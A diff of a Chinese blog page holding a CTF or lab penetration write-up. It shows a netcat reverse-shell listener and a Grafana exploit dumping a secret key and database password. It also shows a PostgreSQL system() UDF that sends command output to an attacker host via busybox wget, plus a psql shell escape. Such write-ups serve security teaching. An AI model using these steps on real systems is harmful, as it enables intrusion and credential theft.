-<div class="highlight highlight-source-shell"><pre class="notranslate">root@web01:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> nc -lnvp 2333</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">root@web01:~# nc -lnvp 2333
 Listening on 0.0.0.0 2333
 Connection received on 172.30.12.236 38490
-bash: cannot <span class="pl-c1">set</span> terminal process group (655): Inappropriate ioctl <span class="pl-k">for</span> device
-bash: no job control <span class="pl-k">in</span> this shell
-root@web03:/<span class="pl-c"><span class="pl-c">#</span> id</span>
+bash: cannot set terminal process group (655): Inappropriate ioctl for device
+bash: no job control in this shell
+root@web03:/# id
 id
-uid=0(root) gid=0(root) groups=0(root)</pre></div>
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
 <pre lang="text" class="notranslate"><code class="notranslate">flag03: flag{84fc82d5-cd67-4570-988b-e22ca6c009ce}
 </code></pre>
 <h2>二层内网</h2>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@web03:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> ip a</span>
-1: lo: <span class="pl-k">&lt;</span>LOOPBACK,UP,LOWER_UP<span class="pl-k">&gt;</span> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+<pre lang="bash" class="notranslate"><code class="notranslate">root@web03:~# ip a
+1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
     inet 127.0.0.1/8 scope host lo
        valid_lft forever preferred_lft forever
     inet6 ::1/128 scope host
        valid_lft forever preferred_lft forever
-2: eth0: <span class="pl-k">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="pl-k">&gt;</span> mtu 1500 qdisc mq state UP group default qlen 1000
+2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
     link/ether 00:16:3e:03:09:b1 brd ff:ff:ff:ff:ff:ff
     inet 172.30.12.236/16 brd 172.30.255.255 scope global dynamic eth0
        valid_lft 1892153747sec preferred_lft 1892153747sec
     inet6 fe80::216:3eff:fe03:9b1/64 scope link
        valid_lft forever preferred_lft forever
-3: eth1: <span class="pl-k">&lt;</span>BROADCAST,MULTICAST,UP,LOWER_UP<span class="pl-k">&gt;</span> mtu 1500 qdisc mq state UP group default qlen 1000
+3: eth1: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc mq state UP group default qlen 1000
     link/ether 00:16:3e:03:09:09 brd ff:ff:ff:ff:ff:ff
     inet 172.30.54.179/24 brd 172.30.54.255 scope global eth1
        valid_lft forever preferred_lft forever
     inet6 fe80::216:3eff:fe03:909/64 scope link
-       valid_lft forever preferred_lft forever</pre></div>
+       valid_lft forever preferred_lft forever
+</code></pre>
 <p>双网卡新网段172.30.54.179/24，继续fscan扫描，有用信息如下，全端口扫描也没有更多信息，不过tscan嗦了，工具确实很好，以后经济实力够了一定支持一下<br>
 <a href="https://github.com/TideSec/TscanPlus">TideSec/TscanPlus: 一款综合性网络安全检测和运维工具，旨在快速资产发现、识别、检测，构建基础资产信息库，协助甲方安全团队或者安全运维人员有效侦察和检索资产，发现存在的薄弱点和攻击面。</a></p>
 <pre lang="text" class="notranslate"><code class="notranslate">(icmp) Target 172.30.54.12    is alive
@@ -1619,12 +1630,13 @@ start vulscan
 </code></pre>
 <p><a target="_blank" rel="noopener noreferrer" href="https://github.com/user-attachments/assets/d7de6827-7387-4fa6-96ca-46f08f75784b"><img width="2000" height="1136" alt="Image" src="https://github.com/user-attachments/assets/d7de6827-7387-4fa6-96ca-46f08f75784b" style="max-width: 100%; height: auto; max-height: 1136px;"></a></p>
 <p>关于Grafana的详解可以去看Data的WP，这里工具直接嗦了</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">root@web03:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> ./linux_amd64_grafanaExp exp -u http://172.30.54.12:3000/</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">root@web03:~# ./linux_amd64_grafanaExp exp -u http://172.30.54.12:3000/
 2025/12/25 23:41:27 Target vulnerable has plugin [alertlist]
 2025/12/25 23:41:27 Got secret_key [SW2YcwTIb9zpOOhoPsMm]
-2025/12/25 23:41:27 There are [1] records <span class="pl-k">in</span> data_source table.
+2025/12/25 23:41:27 There are [1] records in data_source table.
 2025/12/25 23:41:27 type:[postgres]     name:[PostgreSQL]               url:[localhost:5432]    user:[postgres]      password[Postgres@123]  database:[postgres]     basic_auth_user:[]      basic_auth_password:[]
-2025/12/25 23:41:27 All Done, have nice day<span class="pl-k">!</span></pre></div>
+2025/12/25 23:41:27 All Done, have nice day!
+</code></pre>
 <p>但文件读取没法拿shell的，走sql了</p>
 <pre lang="text" class="notranslate"><code class="notranslate">[*] 2025-12-25 23:43:08 - 正在连接...
 [*] 2025-12-25 23:43:09 - 连接成功！
@@ -1634,28 +1646,31 @@ start vulscan
 
 </code></pre>
 <p>不过这个代理设置，临时文件弄不过去，mdut还得改进，手动搞吧</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">postgres=<span class="pl-c"><span class="pl-c">#</span> CREATE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAG</span>
-E <span class="pl-s"><span class="pl-pds">'</span>C<span class="pl-pds">'</span></span> STRICT<span class="pl-k">;</span>
+<pre lang="bash" class="notranslate"><code class="notranslate">postgres=# CREATE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAG
+E 'C' STRICT;
 CREATE FUNCTION
 
-postgres=<span class="pl-c"><span class="pl-c">#</span> select system('busybox wget 172.30.54.179:8000/`id`');</span>
+postgres=# select system('busybox wget 172.30.54.179:8000/`id`');
  system
 --------
     256
 (1 row)
 
 
-root@web03:<span class="pl-k">~</span><span class="pl-c"><span class="pl-c">#</span> python3 -m http.server</span>
+root@web03:~# python3 -m http.server
 Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
 172.30.54.12 - - [26/Dec/2025 00:18:08] code 404, message File not found
-172.30.54.12 - - [26/Dec/2025 00:18:08] <span class="pl-s"><span class="pl-pds">"</span>GET /uid=112(postgres) HTTP/1.1<span class="pl-pds">"</span></span> 404 -</pre></div>
+172.30.54.12 - - [26/Dec/2025 00:18:08] "GET /uid=112(postgres) HTTP/1.1" 404 -
+</code></pre>
 <p>能够接到响应，弹shell即可，它这个有点不稳定，直接一个反弹shell把服务打崩了，</p>
 <p><a href="https://gtfobins.github.io/gtfobins/psql/" rel="nofollow">psql | GTFOBins</a></p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">psql
-<span class="pl-cce">\?</span>
-<span class="pl-k">!</span>/bin/sh</pre></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">psql
+\?
+!/bin/sh
+</code></pre>
 <p>提权即可</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">flag04: flag{8ef1d030-83ed-40c2-a512-6e92838b6f7a}</pre></div></div>
+<pre lang="bash" class="notranslate"><code class="notranslate">flag04: flag{8ef1d030-83ed-40c2-a512-6e92838b6f7a}
+</code></pre></div>
 <div style="font-size:small;margin-top:8px;float:right;"></div>
 
 <button class="btn btn-block" type="button" onclick="openComments()" id="cmButton">评论</button>
@@ -1680,7 +1695,7 @@ if(""!=""){
 </script></div>
 </body>
 <script>
-var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z', 'copy': 'M0 6.75C0 5.784.784 5 1.75 5h1.5a.75.75 0 0 1 0 1.5h-1.5a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-1.5a.75.75 0 0 1 1.5 0v1.5A1.75 1.75 0 0 1 9.25 16h-7.5A1.75 1.75 0 0 1 0 14.25Z M5 1.75C5 .784 5.784 0 6.75 0h7.5C15.216 0 16 .784 16 1.75v7.5A1.75 1.75 0 0 1 14.25 11h-7.5A1.75 1.75 0 0 1 5 9.25Zm1.75-.25a.25.25 0 0 0-.25.25v7.5c0 .138.112.25.25.25h7.5a.25.25 0 0 0 .25-.25v-7.5a.25.25 0 0 0-.25-.25Z', 'check': 'M13.78 4.22a.75.75 0 0 1 0 1.06l-7.25 7.25a.75.75 0 0 1-1.06 0L2.22 9.28a.751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018L6 10.94l6.72-6.72a.75.75 0 0 1 1.06 0Z'};
+var IconList={'sun': 'M8 10.5a2.5 2.5 0 100-5 2.5 2.5 0 000 5zM8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0V.75A.75.75 0 018 0zm0 13a.75.75 0 01.75.75v1.5a.75.75 0 01-1.5 0v-1.5A.75.75 0 018 13zM2.343 2.343a.75.75 0 011.061 0l1.06 1.061a.75.75 0 01-1.06 1.06l-1.06-1.06a.75.75 0 010-1.06zm9.193 9.193a.75.75 0 011.06 0l1.061 1.06a.75.75 0 01-1.06 1.061l-1.061-1.06a.75.75 0 010-1.061zM16 8a.75.75 0 01-.75.75h-1.5a.75.75 0 010-1.5h1.5A.75.75 0 0116 8zM3 8a.75.75 0 01-.75.75H.75a.75.75 0 010-1.5h1.5A.75.75 0 013 8zm10.657-5.657a.75.75 0 010 1.061l-1.061 1.06a.75.75 0 11-1.06-1.06l1.06-1.06a.75.75 0 011.06 0zm-9.193 9.193a.75.75 0 010 1.06l-1.06 1.061a.75.75 0 11-1.061-1.06l1.06-1.061a.75.75 0 011.061 0z', 'moon': 'M9.598 1.591a.75.75 0 01.785-.175 7 7 0 11-8.967 8.967.75.75 0 01.961-.96 5.5 5.5 0 007.046-7.046.75.75 0 01.175-.786zm1.616 1.945a7 7 0 01-7.678 7.678 5.5 5.5 0 107.678-7.678z', 'sync': 'M1.705 8.005a.75.75 0 0 1 .834.656 5.5 5.5 0 0 0 9.592 2.97l-1.204-1.204a.25.25 0 0 1 .177-.427h3.646a.25.25 0 0 1 .25.25v3.646a.25.25 0 0 1-.427.177l-1.38-1.38A7.002 7.002 0 0 1 1.05 8.84a.75.75 0 0 1 .656-.834ZM8 2.5a5.487 5.487 0 0 0-4.131 1.869l1.204 1.204A.25.25 0 0 1 4.896 6H1.25A.25.25 0 0 1 1 5.75V2.104a.25.25 0 0 1 .427-.177l1.38 1.38A7.002 7.002 0 0 1 14.95 7.16a.75.75 0 0 1-1.49.178A5.5 5.5 0 0 0 8 2.5Z', 'home': 'M6.906.664a1.749 1.749 0 0 1 2.187 0l5.25 4.2c.415.332.657.835.657 1.367v7.019A1.75 1.75 0 0 1 13.25 15h-3.5a.75.75 0 0 1-.75-.75V9H7v5.25a.75.75 0 0 1-.75.75h-3.5A1.75 1.75 0 0 1 1 13.25V6.23c0-.531.242-1.034.657-1.366l5.25-4.2Zm1.25 1.171a.25.25 0 0 0-.312 0l-5.25 4.2a.25.25 0 0 0-.094.196v7.019c0 .138.112.25.25.25H5.5V8.25a.75.75 0 0 1 .75-.75h3.5a.75.75 0 0 1 .75.75v5.25h2.75a.25.25 0 0 0 .25-.25V6.23a.25.25 0 0 0-.094-.195Z', 'github': 'M8 0c4.42 0 8 3.58 8 8a8.013 8.013 0 0 1-5.45 7.59c-.4.08-.55-.17-.55-.38 0-.27.01-1.13.01-2.2 0-.75-.25-1.23-.54-1.48 1.78-.2 3.65-.88 3.65-3.95 0-.88-.31-1.59-.82-2.15.08-.2.36-1.02-.08-2.12 0 0-.67-.22-2.2.82-.64-.18-1.32-.27-2-.27-.68 0-1.36.09-2 .27-1.53-1.03-2.2-.82-2.2-.82-.44 1.1-.16 1.92-.08 2.12-.51.56-.82 1.28-.82 2.15 0 3.06 1.86 3.75 3.64 3.95-.23.2-.44.55-.51 1.07-.46.21-1.61.55-2.33-.66-.15-.24-.6-.83-1.23-.82-.67.01-.27.38.01.53.34.19.73.9.82 1.13.16.45.68 1.31 2.69.94 0 .67.01 1.3.01 1.49 0 .21-.15.45-.55.38A7.995 7.995 0 0 1 0 8c0-4.42 3.58-8 8-8Z'};
 var utterancesLoad=0;
 
 let themeSettings={
@@ -1754,70 +1769,7 @@ function iFrameLoading(){
     }
 }
 
-document.addEventListener('DOMContentLoaded', () => {
-    const createClipboardHTML = (codeContent, additionalClasses = '') => `
-        <pre class="notranslate"><code class="notranslate">${codeContent}</code></pre>
-        <div class="clipboard-container position-absolute right-0 top-0 ${additionalClasses}">
-            <clipboard-copy class="ClipboardButton btn m-2 p-0" role="button" style="display: inherit;">
-                <svg height="16" width="16" class="octicon octicon-copy m-2"><path d="${IconList["copy"]}"></path></svg>
-                <svg height="16" width="16" class="octicon octicon-check color-fg-success m-2 d-none"><path d="${IconList["check"]}"></path></svg>
-            </clipboard-copy>
-            <div class="copy-feedback">Copied!</div>
-        </div>
-    `;
 
-    const handleCodeElements = (selector = '') => {
-        document.querySelectorAll(selector).forEach(codeElement => {
-            const codeContent = codeElement.innerHTML;
-            const newStructure = document.createElement('div');
-            newStructure.className = 'snippet-clipboard-content position-relative overflow-auto';
-            newStructure.innerHTML = createClipboardHTML(codeContent);
-
-            const parentElement = codeElement.parentElement;
-            if (selector.includes('highlight')) {
-                parentElement.insertBefore(newStructure, codeElement.nextSibling);
-                parentElement.removeChild(codeElement);
-            } else {
-                parentElement.parentElement.replaceChild(newStructure, parentElement);
-            }
-        });
-    };
-
-    handleCodeElements('pre.notranslate > code.notranslate');
-    handleCodeElements('div.highlight > pre.notranslate');
-
-    let currentFeedback = null;
-    document.querySelectorAll('clipboard-copy').forEach(copyButton => {
-        copyButton.addEventListener('click', () => {
-            const codeContent = copyButton.closest('.snippet-clipboard-content').innerText;
-            const tempTextArea = document.createElement('textarea');
-            tempTextArea.value = codeContent;
-            document.body.appendChild(tempTextArea);
-            tempTextArea.select();
-            document.execCommand('copy');
-            document.body.removeChild(tempTextArea);
-
-            const copyIcon = copyButton.querySelector('.octicon-copy');
-            const checkIcon = copyButton.querySelector('.octicon-check');
-            const copyFeedback = copyButton.nextElementSibling;
-
-            if (currentFeedback && currentFeedback !== copyFeedback) {currentFeedback.style.display = 'none';}
-            currentFeedback = copyFeedback;
-
-            copyIcon.classList.add('d-none');
-            checkIcon.classList.remove('d-none');
-            copyFeedback.style.display = 'block';
-            copyButton.style.borderColor = 'var(--color-success-fg)';
-
-            setTimeout(() => {
-                copyIcon.classList.remove('d-none');
-                checkIcon.classList.add('d-none');
-                copyFeedback.style.display = 'none';
-                copyButton.style.borderColor = '';
-            }, 2000);
-        });
-    });
-});
 
 </script>
 
